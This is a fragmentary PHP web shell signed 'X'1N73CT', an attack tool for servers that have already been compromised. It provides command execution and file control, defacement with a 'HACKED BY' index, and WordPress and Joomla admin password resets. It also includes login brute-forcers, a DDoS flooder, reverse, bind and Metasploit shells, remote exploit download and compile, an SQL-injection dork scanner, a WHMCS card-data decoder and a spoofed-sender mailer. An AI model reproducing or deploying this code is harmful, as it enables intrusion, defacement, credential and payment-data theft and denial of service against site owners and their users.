...
<?php echo $_SERVER['HTTP_HOST']; ?> Port 80</address> 
<style> 
input { margin:0;
...
|&nbsp;
WGet: ' . testwget() . '<br>';
$buff .= '<font color=00ff00 ><b>' . $letters . '&nbsp;
&gt;
&nbsp;
' . $pwdurl . '</b></font>';
function rapih($text)
...
\">
<tr><td><b>$prompt</b></td><td><input onMouseOver=\"this.focus();
...
<tr><td><b>view file/folder</b></td><td><input onMouseOver="this.focus();
...
<tr><th>name</th><th style="width:80px;
...
\">" . $owner . '</td><td><center>' . get_perms($pwd) . '</center></td>
        <td style="text-align:center;
">' . date('d-M-Y H:i', @filemtime($pwd)) . "</td><td><span id=\"titik1\">
        <a href=\"?y=$pwd&amp;
edit=" . $pwd . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');
\">newfolder</a></span>
        <form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;
padding:0;
\">
        <input type=\"hidden\" name=\"y\" value=\"" . $pwd . '" />
...
" value="Go !" />
        ...
        ';
            ...
            $buff .= '<tr><td><a href="?y=' . $parent . "\"><img src='data:image/png;
...
edit=" . $parent . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');
\">newfolder</a></span>
...
" value="Go !" />
            ...
            $buff .= '<tr><td><a id="' . clearspace($folder) . '_link" href="?y=' . $pwd . $folder . DIRECTORY_SEPARATOR . "\"><b><img src='data:image/png;
...
view=$full\"><b><img src='data:image/png;
...
<tr><td><input style="width:19%;
" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form>
</table>
</form>
...
<?php echo '<center/><br/><b><font color=#00ff00>+--==[ Mysql Interface ]==--+</font></b><br><br>';
        mkdir('mysql', 0755);
        chdir('mysql');
        $akses = '.htaccess';
        $buka_lah = "$akses";
...
<table class="cmdbox">
<tr><td>
<textarea class="output" name="mail_content" id="cmd" style="height:340px;
...
<tr><td>&nbsp;
<input class="inputz" style="width:20%;
" type="text" value="X-1n73ct@fbi.gov" name="mail_from" />&nbsp;
from</td></tr>
<tr><td>&nbsp;
<input class="inputz" style="width:20%;
...
" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form>
<tr><td>&nbsp;
&nbsp;
&nbsp;
&nbsp;
...
" />
    <input class="inputz" style="width:200px;
" type="text" name="newname" value="' . $filn . "\" />
    <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
...
<tr><td colspan="2">Save as <input onMouseOver="this.focus();
" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;
" value="
<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;
" />
&nbsp;
...
<?php system('ls /var/mail'); ?></textarea></strong></td>
</tr>
<tr>
<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
...
<?php if ('' == ($func = @ini_get('disable_functions'))) {
            echo '<font color=#00ff00>No Security for Function</font></b>';
        } else {
            echo '<script>alert("Please see below and press >Please Click Here First!<");
</script>';
...
<?php
        ...
        ?>
<form action="?y=
<?php echo $pwd; ?>&x=tutor" method="post">
...
<?php if (!file_exists('pee.tmp')) {
        ...
        ?>
<form action="?y=
<?php echo $pwd; ?>&x=jss" method="post">
...
<tr><td width=\"30%\"><b>Server IP&nbsp;
&nbsp;
&nbsp;
&nbsp;
: </b></td><td><b>' . $ip . '</b></td></tr> 
<tr><td width=\"30%\"><b>Sites Found&nbsp;
: </b></td><td><b>' . count(array_unique($allDmns)) . '</b></td></tr>
</table>';
            echo '<br><br>';
            echo'<table border="1" width="80%" align=\"center\">';
        ...
        ?>
<form action="?y=
<?php echo $pwd; ?>&x=dump" method="post">

<?php echo $head . '<p align="center">';
        echo '
...
filename=' . $file);
        ...
        ?>
<form action="?y=
<?php echo $pwd; ?>&x=port-sc" method="post">

<?php echo '<br><br><center><br><b>+--=[ Port Scanner ]=--+</b><br>';
...
++$i) {
            ...
            echo '<table class=tabnet style="width:300px;
padding:0 1px;
">
...
<tr>
    <td>Host</td>
    <td><input type="text" class="inputz" style="width:220px;
color:#00ff00;
...
" name="end" value="5000"/></td>
        ...
        if (isset($submit)) {
            $pass = $_POST['password'];
            $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;
IO[JN';
            $hash = md5($pass);
            $md4 = hash('md4', $pass);
...
<?php function decrypt($string, $cc_encryption_hash)
        {
...
<br>
<table class=tabnet style=width:320px;
padding:0 1px;
>
<tr><th colspan=2>WHMCS Decoder</th></tr> 
<tr><td>db_host </td><td><input type='text' style='color:#00ff00;
background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#00ff00;
background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#00ff00;
background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#00ff00;
background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#00ff00;
background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;
&nbsp;
&nbsp;
&nbsp;
<INPUT class='inputzbut' type='submit' style='color:#00ff00;
background-color:' value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";
...
<td style='background-color:#0000;
padding-left:10px;
'><tr><tr><th colspan="2"><h2>Zone-H Defacer</h2></th></tr></td></tr><tr><td height='45' colspan='2'><form method="post">
...
<center><textarea style="background:black;
outline:none;
" name="domain" cols="116" rows="9" id="domains">List Of Domains</textarea>
...
<center><br><Br><br>
    ...
    <tr class="optionstr"><b><td>Result</td><td>:</td><td>
<?php echo $hashresult; ?></td></tr></b>
</table></tr></form>
</center>
...
<input class='inputzbut' type='submit' name='submit' value='Encrypt'>
...
<td>&nbsp;
&nbsp;
Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="
<?php echo getcwd(); ?>"></td>
</tr><br>
<tr>
...
outline:none;
' name='index' rows='10' cols='67'>HACKED BY X'1N73CT,PATCH YOUR SECURITY SYSTEM</textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;
&nbsp;
Deface&nbsp;
&nbsp;
"></center></form></table><br></form>
...
YXRhY2hlZFxuXG4iOw==';
    ...
    } elseif (isset($_GET['x']) && ('jbrute' == $_GET['x'])) {
        ?>
<form action="?y=
<?php echo $pwd; ?>&amp;
...
<tr>
    <td>
<textarea name="sites" style="background:black;
" cols="40" rows="13" ></textarea>
</td><td>
<textarea name="w0rds" style="background:black;
" cols="40" rows="13" >
admin
123456
password
...
rv:1.8.1.15) Gecko/2008111317 Firefox/3.0.4');
    ...
    } elseif (isset($_GET['x']) && ('vb' == $_GET['x'])) {
        ?>
<form action="?y=
<?php echo $pwd; ?>&x=vb" method="post">
...
");
            ...
            $h = "
<?php echo(stripslashes(base64_decode('" . urlencode(base64_encode(str_replace("'", "'", ($_POST['code'])))) . "')));
exit;
...
<script language=JavaScript>m='%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/table%3E%0A%09%09%09%09%3C/td%3E%0A%3C/html%3E';
d=unescape(m);
document.write(d);
</script>

<?php
    } elseif (isset($_GET['x']) && ('cgi2012' == $_GET['x'])) {
        echo '<center/><br/><b>
...
<?php echo '<center/><br/><b><font color=#00ff00>+--==[ Config Shell Priv8 SCR ]==--+</font></b><br><br>';
        mkdir('config', 0755);
        chdir('config');
        $kokdosya = '.htaccess';
        $dosya_adi = "$kokdosya";
...
AddHandler cgi-script .izo';
    ...
    } elseif (isset($_GET['x']) && ('wp-reset' == $_GET['x'])) {
        ?>
<form action="?y=
<?php echo $pwd; ?>&amp;
x=wp-reset" method="post">

<?php echo '<center/><br/><b><font color=#00ff00>+--==[ Wordpress Reset Password ]==--+</font></b><br><br>';
        if (empty($_POST['pwd'])) {
...
' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;
&nbsp;
Database</td><td>
<input style='width:220px;
' class='inputz' type='text' name='database' value='wp-' /></td></tr> <tr><td>&nbsp;
&nbsp;
username</td><td>
<input style='width:220px;
' class='inputz' type='text' name='username' value='wp-' /></td></tr> <tr><td>&nbsp;
&nbsp;
password</td><td>
<input style='width:220px;
' class='inputz' type='text' name='password' value='**' /></td></tr>
<tr><td>&nbsp;
&nbsp;
User baru</td><td>
<input style='width:220px;
' class='inputz' type='text' name='admin' value='admin' /></td></tr>
<tr><td>&nbsp;
&nbsp;
Pass Baru</td><td>
<input style='width:80px;
' class='inputz' type='text' name='pwd' value='123456' />&nbsp;

<input style='width:19%;
' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
...
";
    ...
    } elseif (isset($_GET['x']) && ('jm-reset' == $_GET['x'])) {
        ?>
<form action="?y=
<?php echo $pwd; ?>&amp;
x=jm-reset" method="post">

<?php echo '<center/><br/><b><font color=#00ff00>+--==[ Joomla Reset Password ]==--+</font></b><br><br>';
        if (empty($_POST['pwd'])) {
            echo "<FORM method='POST'><table class='tabnet' style='width:300px;
'> <tr><th colspan='2'>Connect to mySQL </th></tr> <tr><td>&nbsp;
&nbsp;
Host</td><td>
...
Database</td><td>
<input style='width:270px;
' class='inputz' type='text' name='database' value='database' /></td></tr> <tr><td>&nbsp;
&nbsp;
username</td><td>
<input style='width:270px;
' class='inputz' type='text' name='username' value='db_user' /></td></tr> <tr><td>&nbsp;
&nbsp;
password</td><td>
<input style='width:270px;
' class='inputz' type='password' name='password' value='**' /></td></tr>
<tr><td>&nbsp;
&nbsp;
User baru</td><td>
<input style='width:270px;
' class='inputz' name='admin' value='admin' /></td></tr>
<tr><td>&nbsp;
&nbsp;
pass baru </td><td>123456 = 
<input style='width:130px;
' class='inputz' name='pwd' value='e10adc3949ba59abbe56e057f20f883e' />&nbsp;
...
"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
</span></td></tr>
</form></td></tr>
<br /></table>
</div> <!-- /tube -->
...
<br clear="all"><br>';
        ...
        function show($msg, $br = 1, $stop = 0, $place = 'logbox', $replace = 0)
        {
            ...
            echo "<script type=\"text/javascript\">insertcode('" . $msg . "', '" . $place . "', '" . $replace . "');
</script>";
            if (1 == $stop) {
                exit;
            }
        ...
        foreach ($pathes as $path) {
            ...
            if (0 == check($path)) {
                ...
                show('<span style="color: #00FF00;
"><strong>found</strong></span>', 1, 0, 'logbox', 0);
...
"><strong>found</strong></span>', 1, 0, 'logbox', 0);
    ...
    } elseif (isset($_GET['x']) && ('wpbrute' == $_GET['x'])) {
        ?>
<form action="?y=
<?php echo $pwd; ?>&amp;
...
<td ><textarea style="background:black;
" name="hosts" cols="30" rows="10" >
<?php if ($_POST) {
            echo $_POST['hosts'];
        } ?></textarea></td>
<td ><textarea style="background:black;
" name="usernames" cols="30" rows="10" >
<?php if ($_POST) {
...
<td ><textarea style="background:black;
" name="passwords" cols="30" rows="10" >
<?php if ($_POST) {
...
<?php if ($_POST) {
            ...
            if ($passwords && $usernames && $hosts) {
                ...
                foreach ($hosts_explode as $host) {
                    ...
                    $hacked = 0;
                    $host = str_replace(['http://', 'https://', 'www.'], '', trim($host));
                    $host = 'http://' . $host;
                    ...
                    foreach ($usernames_explode as $username) {
                        foreach ($passwords_explode as $password) {
                            ...
                            curl_setopt($ch, CURLOPT_POSTFIELDS, 'log=' . $username . '&pwd=' . $password . '&wp-submit=Giri&#8207;
' . '&redirect_to=' . $wpAdmin . '&testcookie=1');
                            $login = curl_exec($ch);
...
<?php function url_exists($strURL)
        {
            $resURL = curl_init();
...
<?php echo $my_ip; ?></b></font>&nbsp;
(Don't DoS yourself nub)<br><br>
<table class="tabnet" style="width:333px;
padding:0 1px;
">
<th colspan="5">Ddos Tool</th>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25" value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';
" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';
"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25" value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';
" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';
"/>
</td></tr>
<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5" value = "port" onblur = "if ( this.value=='' ) this.value = 'port';
...
<?php $submit = $_POST['fire'];
        if (isset($submit)) {
            ...
            $time = time();
            echo "Flooded: $ip on port $rand <br><br>";
...
<?php echo '<br><br><center><h1>+--=[ local domain viewer ]=--+</h1></center><br><br><div class=content>';
...
<?php error_reporting(0);
        ...
        $rsportb4 = $rsport;
        $rstarget4 = $s_my_ip;
        $s_result = "<br><br><br><center><table><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=
<?php echo $pwd;

?>&amp;
x='tool'><table class='tabnet'><tr><td style='width:110px;
...
' class='inputz' type='text' name='sqlportb4' value='" . $rsportb4 . "' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;
height:30px;
margin:10px 2px 0 2px;
' /><input type='hidden' name='d' value='" . $pwd . "' /></form></td><td><hr color='#4C83AF'><td><td><form method='POST'><table class='tabnet'><h2>Metasploit Connection </h2><tr><td style='width:110px;
'>Your IP</td><td><input style='width:100%;
...
height:30px;
margin:10px 2px 0 2px;
'></form></td></div></center></table><br><br />";
        echo $s_result;
        if ($_POST['metaConnect']) {
            ...
            if ('' == $ip && '' == $port) {
                ...
                switch ($msgsock_type) {case 'stream': $len = fread($msgsock, 4);
break;
...
break;
                ...
                while (strlen($buffer) < $len) {
                    switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len - strlen($buffer));
                break;
        ...
        ?>
<form action="?y=
<?php echo $pwd; ?>&x=whois" method="post">
...
<tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:#00ff00;
background-color:#000000" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:#00ff00;
background-color:#000000" name="scan" value="Scan !" /></td></tr>
</table></form></div>';
        if (isset($_POST['scan'])) {
...
<div class="tit"> <br /><br />|-------------- END ------------------| <br /></div>';
        ...
        ?>
<form action="?y=
<?php echo $pwd; ?>&x=about" method="post">
...
<?php echo '<br><br><center><form method="post" action=""><b><font color="green">Dork : </font></b> &nbsp;
&nbsp;
<input class="inputz" type="text" value="" name="dork" style="color:#00ff00;
background-color:#000000" size="20"/><input class="inputzbut" type="submit" style="color:#00ff00;
background-color:#000000" name="scan" value="Scan"></form></center>';
        ob_start();
        set_time_limit(0);
        if (isset($_POST['scan'])) {
...
++$id) {
            ...
            foreach ($matches[1] as $site) {
                ...
                $GET = curl_exec($curl);
                if (preg_match('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;
_row()|SELECT * 
FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i', $GET)) {
                    echo '<center><b><font color="#E10000">Found : </font><a href="' . $url . '" target="_blank">' . $url . '</a><font color=#FF0000> &#60;
-- SQLI Vuln 
Found..</font></b></center>';
                    ob_flush();
                    flush();
...
"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;
" name="path" value="
<?php echo $pwd; ?>" /></td></tr>
</tr>
</table></form>
...
<tr><td colspan="2"><form method="post" style="margin:0;
padding:0;
" actions="?y=
<?php echo $pwd; ?>&amp;
x=upload">
<table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;
" value="http://www.some-code/exploits.c"></td></tr>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;
" name="path" value="
<?php echo $pwd; ?>" /></td></tr>
...
</select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;
"></td></tr></form></table></td>
</tr>
</table>
...
<?php echo $pwd; ?>&amp;
x=netsploit">
<tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="
<?php echo $bindport; ?>"></td></tr>
<tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="
<?php echo $bindport_pass; ?>"></td></tr>
...
<?php echo $pwd; ?>&amp;
x=netsploit">
<tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="
<?php echo (getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ('127.0.0.1'); ?>"></td></tr>
<tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="
<?php echo $bindport; ?>"></td></tr>
...
<?php echo $pwd; ?>&amp;
x=netsploit">
<tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;
" value="www.some-code/exploits.c"></td></tr>
<tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;
...
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;
"></td></tr></form>
</table>
</td>
</tr>
...
<tr><td colspan="2">
<?php echo $prompt; ?><input onMouseOver="this.focus();
...
SecFilterCheckUnicodeEncoding Off
    ...
    echo "<script>alert('Disable Functions and Safemode Created');
hideAll();
</script>";
    die();
}
...
<div class="jaya">&copy;
2013 X'1N73CT</div></center><br><br>
</script>
</div>
</body>
</html>

<?php $time_shell = '' . date('d/m/Y - H:i:s') . '';
